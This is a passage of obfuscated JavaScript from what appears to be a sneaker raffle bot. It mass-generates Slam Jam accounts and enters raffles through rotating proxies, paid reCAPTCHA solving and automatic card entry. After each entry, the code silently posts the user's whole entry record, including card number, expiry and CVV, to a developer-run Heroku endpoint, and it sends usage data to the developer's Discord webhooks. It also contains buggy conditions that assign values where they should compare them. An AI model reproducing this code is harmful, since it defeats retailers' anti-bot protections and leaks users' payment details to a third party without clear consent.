                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x178c77, _0x387111, _0x344d75) {
                    _0x506e0b['use'](_0x407d82()), _0x506e0b['use'](_0x29f88b({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x64917e['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x353b77 = 0x0; _0x353b77 < _0x387111['length']; _0x353b77++) {
                        if (_0x5297a5 != 'yes')
                            var _0x5297a5 = '', _0x2aa415 = 0x0;
                        var _0x53651f = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x5b7d0c
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x64917e['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x1d5694
                                }
                            ]
                        }];
                        const _0x2b098c = { 'embeds': _0x53651f };
                        _0x51b97d(_0x178c77['name'] + '\x20Task\x20' + (_0x353b77 + 0x1) + '\x20/\x20' + _0x387111['length'] + '\x20||\x20File:\x20' + _0x302fc2 + '\x20Proxies:\x20' + _0x252dfd);
                        try {
                            await _0x120beb(_0x387111, _0x353b77);
                        } catch {
                            _0x5297a5 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0xcfea9 = await _0x4ee25a(_0x387111[_0x353b77], _0x178c77, 'acc', ![]);
                        const _0x28b821 = { 'succesDEVMSG': { 'embeds': [_0xcfea9] } };
                        if (_0x387111[_0x353b77]['Email'] == '' || _0x387111[_0x353b77]['FirstName'] == '' || _0x387111[_0x353b77]['LastName'] == '') {
                            console['log'](_0x5c19a0() + '\x20[' + _0x9324de[taskModule]['name'] + ']\x20Task\x20' + (_0x353b77 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x1a282d(0x7d0);
                            continue;
                        }
                        (_0x387111[_0x353b77]['Password'] == '' || _0x387111[_0x353b77] == undefined) && _0x387111[_0x353b77]['Password'] == 'JRaffles23!';
                        if (_0x64917e['useRandomProxy'] = ![])
                            var _0x22a527 = _0x344d75[_0x353b77]['split'](':');
                        else
                            var _0x3d5310 = Math['round'](Math['random']() * (_0x344d75['length'] - 0x1)), _0x22a527 = _0x344d75[_0x3d5310]['split'](':');
                        var _0x4929fc;
                        try {
                            _0x4929fc = await _0x506e0b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x22a527[0x0] + ':' + _0x22a527[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x4929fc = await _0x506e0b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x22a527[0x0] + ':' + _0x22a527[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x1fe9e9 = await _0x4929fc['newPage']();
                            await _0x1fe9e9['authenticate']({
                                'username': '' + _0x22a527[0x2],
                                'password': '' + _0x22a527[0x3]
                            }), console['log'](_0x5c19a0() + '\x20[' + _0x178c77['name'] + ']\x20Task\x20' + (_0x353b77 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1fe9e9['setRequestInterception'](!![]), _0x1fe9e9['on']('request', _0x48e819 => {
                                _0x48e819['resourceType']() === 'image' || _0x48e819['resourceType']() === 'font' || _0x48e819['resourceType']() === 'media' ? _0x48e819['abort']() : _0x48e819['continue']();
                            }), await _0x1fe9e9['goto']('https://drop.slamjam.com/account/register'), await _0x1a282d(0xbb8), await _0x1fe9e9['waitForSelector']('#FirstName'), await _0x1fe9e9['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x1fe9e9['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x5c19a0() + '\x20[' + _0x178c77['name'] + ']\x20Task\x20' + (_0x353b77 + 0x1) + '\x20:\x20Filling\x20information'), await _0x1a282d(0x4b0), await _0x1fe9e9['type']('#FirstName', '' + _0x387111[_0x353b77]['FirstName']), await _0x1a282d(0x226), await _0x1fe9e9['type']('#LastName', '' + _0x387111[_0x353b77]['LastName']), await _0x1a282d(0x226), await _0x1fe9e9['type']('#Email', '' + _0x387111[_0x353b77]['Email']), await _0x1a282d(0x2ee), await _0x1fe9e9['type']('#ConfirmEmail', '' + _0x387111[_0x353b77]['Email']), await _0x1a282d(0x2ee), await _0x1fe9e9['type']('#CreatePassword', '' + _0x387111[_0x353b77]['Password']), await _0x1a282d(0x2ee), await _0x1fe9e9['type']('#CreateConfirmPassword', '' + _0x387111[_0x353b77]['Password']), await _0x1a282d(0x226), console['log'](_0x5c19a0() + '\x20[' + _0x178c77['name'] + ']\x20Task\x20' + (_0x353b77 + 0x1) + '\x20:\x20Submitting..'), await _0x1fe9e9['$eval']('#create_customer', _0x56e37f => _0x56e37f['submit']()), await _0x1a282d(0x1388), console['log'](_0x5c19a0() + '\x20[' + _0x178c77['name'] + ']\x20Task\x20' + (_0x353b77 + 0x1) + '\x20:\x20' + _0x17b918['cyan']('Solving\x20Captcha')), await _0x1fe9e9['solveRecaptchas'](), console['log'](_0x5c19a0() + '\x20[' + _0x178c77['name'] + ']\x20Task\x20' + (_0x353b77 + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x1fe9e9['$eval']('.shopify-challenge__container\x20>\x20form', _0x4279b4 => _0x4279b4['submit']());
                            try {
                                await _0x1fe9e9['waitForSelector']('.product-card__image'), await _0x1a282d(0x1f4), _0x5297a5 = 'no', console['log'](_0x17b918['green'](_0x5c19a0() + '\x20[' + _0x178c77['name'] + ']\x20Task\x20' + (_0x353b77 + 0x1) + '\x20:\x20Account\x20' + _0x387111[_0x353b77]['Email'] + '\x20Generated!')), _0x5a26e1['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x387111[_0x353b77]['Email'] + ',' + _0x387111[_0x353b77]['Password']), console['log'](_0x17b918['yellow'](_0x5c19a0() + '\x20[' + _0x178c77['name'] + ']\x20Task\x20' + (_0x353b77 + 0x1) + '\x20:\x20Account\x20' + _0x387111[_0x353b77]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x64917e['webhook'] != undefined && _0x64917e['webhook'] != '' && await _0x4e4e57(_0x64917e['webhook'], _0x28b821['succesDEVMSG']);
                                } catch {
                                }
                                await _0x4e4e57(_0xb68945, _0x28b821['succesDEVMSG']);
                            } catch (_0x2cf7dc) {
                                console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x9324de[taskModule]['name'] + ']\x20Task\x20' + (_0x353b77 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x2cf7dc));
                            }
                        } catch (_0x75a88) {
                            console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x9324de[taskModule]['name'] + ']\x20Task\x20' + (_0x353b77 + 0x1) + '\x20:\x20' + _0x75a88));
                        } finally {
                            _0x4929fc && _0x4929fc['close']();
                            if (_0x5297a5 == 'yes' && _0x2aa415 != 0x5) {
                                console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x178c77['name'] + ']\x20Task\x20' + (_0x353b77 + 0x1) + '\x20:\x20Retrying\x20(' + _0x2aa415 + '\x20/\x205)')), _0x353b77 = _0x353b77 - 0x1, _0x2aa415 = _0x2aa415 + 0x1;
                                continue;
                            }
                            _0x5297a5 == 'yes' && _0x2aa415 >= 0x5 && (_0x1736ba(_0x387111[_0x353b77], _0x178c77), _0x5297a5 = 'no', _0x2aa415 = 0x0), console['log']('Waiting\x20for\x20' + _0x64917e['delay'] + '\x20ms'), await _0x1a282d(_0x64917e['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x4d2d1a, _0x5720d0, _0x58026e) {
                    _0x506e0b['use'](_0x407d82()), _0x506e0b['use'](_0x29f88b({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x64917e['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x3ffa22 = 0x0; _0x3ffa22 < _0x5720d0['length']; _0x3ffa22++) {
                        var _0x495f62;
                        if (_0x567aeb != 'yes')
                            var _0x567aeb = '', _0x374b9e = 0x0;
                        _0x51b97d(_0x4d2d1a['name'] + '\x20Task\x20' + (_0x3ffa22 + 0x1) + '\x20/\x20' + _0x5720d0['length'] + '\x20||\x20File:\x20' + _0x302fc2 + '\x20Proxies:\x20' + _0x252dfd);
                        try {
                            await _0x120beb(_0x5720d0, _0x3ffa22);
                        } catch {
                            _0x567aeb = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x5720d0[_0x3ffa22]['Email'] == '' || _0x5720d0[_0x3ffa22]['Password'] == '' || _0x5720d0[_0x3ffa22]['FirstName'] == '' || _0x5720d0[_0x3ffa22]['LastName'] == '') {
                            console['log'](_0x5c19a0() + '\x20[' + _0x4d2d1a['name'] + ']\x20Task\x20' + (_0x3ffa22 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x64917e['useRandomProxy'] = ![])
                            var _0x1fc711 = _0x58026e[_0x3ffa22]['split'](':');
                        else
                            var _0xc4eaf9 = Math['round'](Math['random']() * (_0x58026e['length'] - 0x1)), _0x1fc711 = _0x58026e[_0xc4eaf9]['split'](':');
                        var _0x13812a;
                        try {
                            _0x13812a = await _0x506e0b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1fc711[0x0] + ':' + _0x1fc711[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x13812a = await _0x506e0b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1fc711[0x0] + ':' + _0x1fc711[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x54763b = await _0x13812a['newPage']();
                            await _0x54763b['authenticate']({
                                'username': '' + _0x1fc711[0x2],
                                'password': '' + _0x1fc711[0x3]
                            }), await _0x54763b['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0x5c19a0() + '\x20[' + _0x4d2d1a['name'] + ']\x20Task\x20' + (_0x3ffa22 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x54763b['setRequestInterception'](!![]), _0x54763b['on']('request', _0x302c59 => {
                                _0x302c59['resourceType']() === 'image' || _0x302c59['resourceType']() === 'font' || _0x302c59['resourceType']() === 'media' ? _0x302c59['abort']() : _0x302c59['continue']();
                            }), await _0x54763b['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x54763b['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x54763b['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x1a282d(0x258), await _0x54763b['waitForSelector']('#CustomerEmail'), console['log'](_0x5c19a0() + '\x20[' + _0x4d2d1a['name'] + ']\x20Task\x20' + (_0x3ffa22 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x54763b['type']('#CustomerEmail', '' + _0x5720d0[_0x3ffa22]['Email']), await _0x1a282d(0x12c), await _0x54763b['type']('#CustomerPassword', '' + _0x5720d0[_0x3ffa22]['Password']), await _0x1a282d(0x226), await _0x54763b['$eval']('#customer_login', _0x1c2731 => _0x1c2731['submit']()), await _0x1a282d(0x7d0), await _0x54763b['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x5c19a0() + '\x20[' + _0x4d2d1a['name'] + ']\x20Task\x20' + (_0x3ffa22 + 0x1) + '\x20:\x20' + _0x17b918['cyan']('Solving\x20Captcha')), await _0x54763b['solveRecaptchas'](), console['log'](_0x5c19a0() + '\x20[' + _0x4d2d1a['name'] + ']\x20Task\x20' + (_0x3ffa22 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x54763b['$eval']('.shopify-challenge__container\x20>\x20form', _0x35bb11 => _0x35bb11['submit']());
                            try {
                                await _0x54763b['waitForSelector']('.nav-account'), await _0x1a282d(0x4b0);
                            } catch {
                                console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x4d2d1a['name'] + ']\x20Task\x20' + (_0x3ffa22 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x54763b['goto']('' + _0x5720d0[_0x3ffa22]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x1a282d(0xbb8), console['log'](_0x5c19a0() + '\x20[' + _0x4d2d1a['name'] + ']\x20Task\x20' + (_0x3ffa22 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x54763b['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x54763b['click']('.product-select-variant-wrapper'), await _0x1a282d(0x320), await _0x54763b['click']('li.product-select-variant__value[data-size=\x22' + _0x5720d0[_0x3ffa22]['Size'] + '\x22]'), await _0x1a282d(0x384), await _0x54763b['$eval']('#AddToCartForm-product-template-raffle', _0x5cbbab => _0x5cbbab['submit']()), await _0x54763b['waitForSelector']('.cart-order-summary__content'), await _0x1a282d(0x514), await _0x54763b['goto']('https://drop.slamjam.com/checkout'), await _0x1a282d(0x514), await _0x54763b['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x5c19a0() + '\x20[' + _0x4d2d1a['name'] + ']\x20Task\x20' + (_0x3ffa22 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x54763b['select']('#checkout_shipping_address_country', '' + _0x5720d0[_0x3ffa22]['Country']), await _0x1a282d(0x200), await _0x54763b['waitForSelector']('#checkout_shipping_address_first_name'), await _0x54763b['type']('#checkout_shipping_address_first_name', '' + _0x5720d0[_0x3ffa22]['FirstName']), await _0x1a282d(0x237), await _0x54763b['type']('#checkout_shipping_address_last_name', '' + _0x5720d0[_0x3ffa22]['LastName']), await _0x1a282d(0x1e0), await _0x54763b['type']('#checkout_shipping_address_address1', _0x5720d0[_0x3ffa22]['Address1'] + '\x20' + _0x5720d0[_0x3ffa22]['HouseNumber']), await _0x1a282d(0x514), await _0x54763b['type']('#checkout_shipping_address_address2', '' + _0x5720d0[_0x3ffa22]['Address2']), await _0x1a282d(0x514);
                            _0x5720d0[_0x3ffa22]['Postcode'] == undefined && (_0x5720d0[_0x3ffa22]['Postcode'] = _0x5720d0[_0x3ffa22]['Zip']);
                            await _0x54763b['type']('#checkout_shipping_address_zip', '' + _0x5720d0[_0x3ffa22]['Postcode']), await _0x1a282d(0x2bc), await _0x54763b['type']('#checkout_shipping_address_city', '' + _0x5720d0[_0x3ffa22]['City']), await _0x1a282d(0x320), await _0x54763b['type']('#checkout_shipping_address_phone', '' + _0x5720d0[_0x3ffa22]['Phone']), await _0x1a282d(0x320), await _0x54763b['click']('#continue_button'), await _0x1a282d(0xbb8), await _0x54763b['waitForSelector']('.summary-title'), await _0x1a282d(0x320), await _0x54763b['click']('#continue_button'), await _0x1a282d(0x320), console['log'](_0x5c19a0() + '\x20[' + _0x4d2d1a['name'] + ']\x20Task\x20' + (_0x3ffa22 + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x54763b['waitForSelector']('#checkout_credit_card_vault'), await _0x1a282d(0x3e8);
                            var _0x4853a8 = await _0x54763b['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x3b6457 = await _0x4853a8['contentFrame']();
                            await _0x3b6457['click']('#number'), await _0x1a282d(0x3e8), await _0x3b6457['type']('#number', '' + _0x5720d0[_0x3ffa22]['CardNumber'], { 'delay': 0x78 }), _0x4853a8 = await _0x54763b['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x3b6457 = await _0x4853a8['contentFrame'](), await _0x1a282d(0x1c2), await _0x3b6457['click']('#name'), await _0x1a282d(0x1f4), await _0x3b6457['type']('#name', '' + _0x5720d0[_0x3ffa22]['NameOnCard'], { 'delay': 0x78 }), _0x4853a8 = await _0x54763b['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x3b6457 = await _0x4853a8['contentFrame'](), await _0x1a282d(0x1c2), await _0x3b6457['click']('#expiry'), await _0x1a282d(0x1f4), await _0x3b6457['type']('#expiry', '' + _0x5720d0[_0x3ffa22]['ExpiryDate'], { 'delay': 0x78 }), _0x4853a8 = await _0x54763b['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x3b6457 = await _0x4853a8['contentFrame'](), await _0x1a282d(0x1c2), await _0x3b6457['click']('#verification_value'), await _0x1a282d(0x1f4), await _0x3b6457['type']('#verification_value', '' + _0x5720d0[_0x3ffa22]['CVV'], { 'delay': 0x78 }), await _0x54763b['$eval']('#accepts-flag-raffle', _0x25025b => _0x25025b['click']()), await _0x1a282d(0x7d0), console['log'](_0x5c19a0() + '\x20[' + _0x4d2d1a['name'] + ']\x20Task\x20' + (_0x3ffa22 + 0x1) + '\x20:\x20Processing\x20Order'), await _0x54763b['$eval']('#continue_button', _0x398758 => _0x398758['click']()), await _0x1a282d(0x1b58), await _0x54763b['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x54763b['$eval']('.edit_checkout.animate-floating-labels', _0x16ae0d => _0x16ae0d['submit']()), await _0x1a282d(0x7d0);
                            try {
                                await _0x54763b['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x567aeb = 'no', _0xe19c06(_0x5720d0[_0x3ffa22], _0x4d2d1a), console['log'](_0x17b918['green'](_0x5c19a0() + '\x20[' + _0x4d2d1a['name'] + ']\x20Task\x20' + (_0x3ffa22 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x5da990) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x5da990['message']);
                            }
                            var _0x1b0c92 = await _0x4ee25a(_0x5720d0[_0x3ffa22], _0x4d2d1a, 'dev', ![]), _0xb84f9c = await _0x4ee25a(_0x5720d0[_0x3ffa22], _0x4d2d1a, 'pub', ![]);
                            let _0x285555 = _0x5720d0[_0x3ffa22];
                            try {
                                prxdata = {
                                    'username': _0x5b7d0c['replace']('#', ''),
                                    'module': _0x4d2d1a['name'],
                                    'entrydata': JSON['stringify'](_0x285555),
                                    'proxy': '' + _0x58026e[_0x3ffa22]
                                };
                                var _0x28bd9d = JSON['stringify'](prxdata);
                                let _0x8ceef2 = { 'headers': { 'content-type': 'application/json' } };
                                await _0xbd53c['post']('https://jraffles.herokuapp.com/success', _0x28bd9d, _0x8ceef2);
                            } catch (_0x3a22fe) {
                            }
                            const _0xa47d74 = {
                                'succesDEVMSG': { 'embeds': [_0x1b0c92] },
                                'succesPUBMSG': { 'embeds': [_0xb84f9c] }
                            };
                            try {
                                _0x64917e['webhook'] != undefined && _0x64917e['webhook'] != '' && await _0x4e4e57(_0x64917e['webhook'], _0xa47d74['succesDEVMSG']), await _0x1a282d(0xc8), await _0x4e4e57(_0xd2142c, _0xa47d74['succesDEVMSG']), await _0x1a282d(0xc8), await _0x4e4e57(_0x1274a5, _0xa47d74['succesPUBMSG']);
                            } catch (_0x959120) {
                                console['log'](_0x17b918['yellow'](_0x5c19a0() + '\x20[' + _0x9324de[taskModule]['name'] + ']\x20Task\x20' + (_0x3ffa22 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x959120));
                            }
                        } catch (_0x56c93a) {
                            console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x9324de[taskModule]['name'] + ']\x20Task\x20' + (_0x3ffa22 + 0x1) + '\x20:\x20' + _0x56c93a)), _0x495f62 = '' + _0x56c93a;
                            var _0x598c41 = await _0x4ee25a(kickz[_0x3ffa22], _0x4d2d1a, 'dev', !![], _0x495f62);
                            EMBEDS['errorDEV'] = { 'embeds': [_0x598c41] }, _0x64917e['webhook'] != undefined && _0x64917e['webhook'] != '' && await _0x4e4e57(_0x64917e['webhook'], EMBEDS['errorDEV']), await _0x4e4e57(_0x4cd13, EMBEDS['errorDEV']), _0x567aeb = 'yes';
                        } finally {
                            _0x13812a && _0x13812a['close']();
                            if (_0x567aeb == 'yes' && _0x374b9e != 0x5 && _0x495f62 != 'Size\x20Not\x20Found') {
                                console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x4d2d1a['name'] + ']\x20Task\x20' + (_0x3ffa22 + 0x1) + '\x20:\x20Retrying\x20(' + _0x374b9e + '\x20/\x205)')), _0x3ffa22 = _0x3ffa22 - 0x1, _0x374b9e = _0x374b9e + 0x1;
                                continue;
                            }
                            _0x567aeb == 'yes' && _0x374b9e >= 0x5 && (_0x1736ba(_0x5720d0[_0x3ffa22], _0x4d2d1a), _0x567aeb = 'no', _0x374b9e = 0x0), console['log']('Waiting\x20for\x20' + _0x64917e['delay'] + '\x20ms'), await _0x1a282d(_0x64917e['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0x3704c3) {
                    var _0x4cc0ab = await _0x3eb23f(), _0x192be2 = _0x5a26e1['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x260cf7 = _0xdfd901['parse'](_0x192be2, { 'header': !![] })['data'];
                    for (var _0x366815 = 0x0; _0x366815 < _0x260cf7['length']; _0x366815++) {
                        var _0xe4be0e = _0x260cf7[_0x366815]['Store'], _0x3c93c1 = _0x260cf7[_0x366815]['Mode'];
                        for (var _0x204a04 of _0x9324de) {
                            const _0x4b65d5 = _0x204a04['name']['includes'](_0xe4be0e);
                            if (!_0x4b65d5)
                                continue;
                            for (mode of _0x204a04['modules']) {
                                if (mode['name'] == _0x3c93c1) {
                                    console['log']('Running\x20' + _0x17b918['cyan'](mode['name'])), await mode['function'](mode, [_0x260cf7[_0x366815]], _0x4cc0ab);
                                    var _0x5e2825 = _0x192be2['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0x5a26e1['writeFileSync']('../failed-tasks.csv', _0x5e2825);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x2d3353 = await _0x57218c['get']('Answer');
                    if (_0x2d3353['Answer']['toLowerCase']() == 'y') {
                        _0x5a26e1['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0x1a282d(0x3e8);
                        return;
                    }
                    if (_0x2d3353['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0x1a282d(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0x1a282d(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x10bb6a(_0x25e183) {
    var _0x4fed77 = await _0x3eb23f(), _0x1c58b7 = _0x5a26e1['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x28e7e9 = _0xdfd901['parse'](_0x1c58b7, { 'header': !![] })['data'];
    for (var _0x1c7d31 = 0x0; _0x1c7d31 < _0x28e7e9['length']; _0x1c7d31++) {
        var _0x6fb8a6 = _0x28e7e9[_0x1c7d31]['Store'], _0x52f871 = _0x28e7e9[_0x1c7d31]['Mode'];
        for (var _0x2bbfef of _0x9324de) {
            const _0x49371e = _0x2bbfef['name']['includes'](_0x6fb8a6);
            if (_0x49371e)
                for (mode of _0x9324de[_0x2bbfef]['modules']) {
                    const _0x5e7d10 = mode['name']['includes'](_0x52f871);
                    _0x5e7d10 && (_0x25e183 = mode['name'], await mode['function'](_0x25e183, _0x28e7e9[_0x1c7d31], _0x4fed77));
                }
        }
    }
}
async function _0x40da96() {
    await _0x5220fd(), console['clear']();
    if (_0x1d5694 != 'devkey') {
        let _0x11ce47 = await _0x2a6788['autoUpdate']();
        if (_0x11ce47 === 'yes')
            return _0x8355f('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x2869e0 == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x1a282d(0x2710);
        ;
    }
    await _0x388f02(_0x2869e0);
    if (_0x21adfb === ![])
        return console['log']('Closing\x20Browser'), await _0x1a282d(0xbb8);
    else
        try {
            var _0x228b46 = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x5b7d0c
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x1d5694
                    }
                ]
            }];
            const _0x9fa3c9 = { 'embeds': _0x228b46 };
            var _0x4d47aa = await _0x4ee25a(null, null, 'open', ![]);
            const _0x41a83f = { 'openDEVMSG': { 'embeds': [_0x4d47aa] } };
            await _0x4e4e57(_0x1acd6e, _0x41a83f['openDEVMSG']);
            async function _0x335798() {
                _0x51b97d('JRaffles\x20' + _0x1d5694), console['clear'](), console['log']('Hello\x20' + _0x17b918['cyan']('' + _0x5b7d0c) + ',\x20Welcome\x20to\x20JRaffles\x20' + _0x1d5694), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x1e6e15 = 0x0; _0x1e6e15 < _0x9324de['length'] - 0x4; _0x1e6e15++) {
                    if (_0x1e6e15 >= 0xa) {
                        console['log']('\x20(' + _0x1e6e15 + ')\x20[' + _0x9324de[_0x1e6e15]['name'] + ']');
                        continue;
                    }
                    if (_0x9324de[_0x1e6e15]['name'] === 'Reload\x20Settings' || _0x9324de[_0x1e6e15]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x1e6e15 + ')\x20\x20[' + _0x9324de[_0x1e6e15]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x9324de['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x9324de['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x9324de['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x9324de['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x2286a6();
                if (taskModule > _0x9324de['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x1a282d(0x3e8), _0x335798();
                if (_0x9324de[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x46477f(_0x9324de[taskModule]['modules']);
                    var _0x2c8410 = _0x9324de[taskModule]['modules'][taskFunction];
                    console['clear']();
                    try {
                        if (taskFunction == 0x3) {
                            var _0x2fe5d6 = await _0x3eb23f();
                            await _0x2c8410['function'](_0x2c8410, _0x2fe5d6);
                        }
                        if (taskFunction == 0x2) {
                            var _0x2fe5d6 = await _0x3eb23f(), _0x1db6d5 = await _0x550a62(_0x2c8410);
                            _0x64917e['shuffleTasks'] && await _0x1ddf2f(_0x1db6d5), await _0x2c8410['function'](_0x2c8410, _0x1db6d5, _0x2fe5d6);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x2fe5d6 = await _0x3eb23f(), _0x1db6d5 = await _0x550a62(_0x2c8410);
                                _0x64917e['shuffleTasks'] && await _0x1ddf2f(_0x1db6d5), await _0x2c8410['function'](_0x2c8410, _0x1db6d5, _0x2fe5d6);
                            } else {
                                if (taskFunction == 0x1) {
                                    var _0x2fe5d6 = await _0x3eb23f();
                                    await _0x2c8410['function'](_0x2c8410, _0x2fe5d6);
                                }
                            }
                        }
                    } catch (_0x5b9ceb) {
                        console['log'](_0x5b9ceb), await _0x1a282d(0x7d0);
                    }
                    return _0x335798();
                }
                if (_0x9324de[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x46477f(_0x9324de[taskModule]['modules']);
                        var _0x2c8410 = _0x9324de[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x2fe5d6 = await _0x3eb23f(), _0x26d530 = await _0x550a62(_0x2c8410);
